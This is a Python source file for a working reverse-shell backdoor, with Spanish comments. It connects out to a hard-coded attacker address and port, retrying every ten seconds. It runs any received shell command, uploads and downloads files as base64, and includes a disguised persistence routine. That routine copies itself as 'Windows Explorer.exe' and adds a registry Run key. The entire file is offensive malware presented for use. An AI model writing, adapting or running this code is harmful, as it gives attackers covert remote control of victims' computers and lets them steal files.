import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time

class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent() # Descomentar para activar persistencia
        self.ip = ip
        self.port = port
        self.conectar()

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '" /f', shell=True)

    def conectar(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                self.run()
            except Exception:
                time.sleep(10) # Reintento de conexión

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Archivo subido correctamente."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "salir":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    result = "[+] Directorio: " + os.getcwd()
                elif command[0] == "descargar":
                    result = self.leer_archivo(command[1])
                elif command[0] == "subir":
                    result = self.escribir_archivo(command[1], command[2])
                else:
                    result = self.ejecutar_comando(command).decode()
            except Exception as e:
                result = "[-] Error: " + str(e)

            self.reliable_send(result)

# Cambia la IP por la de tu servidor
puerta = Backdoor("192.168.1.9", 4444)
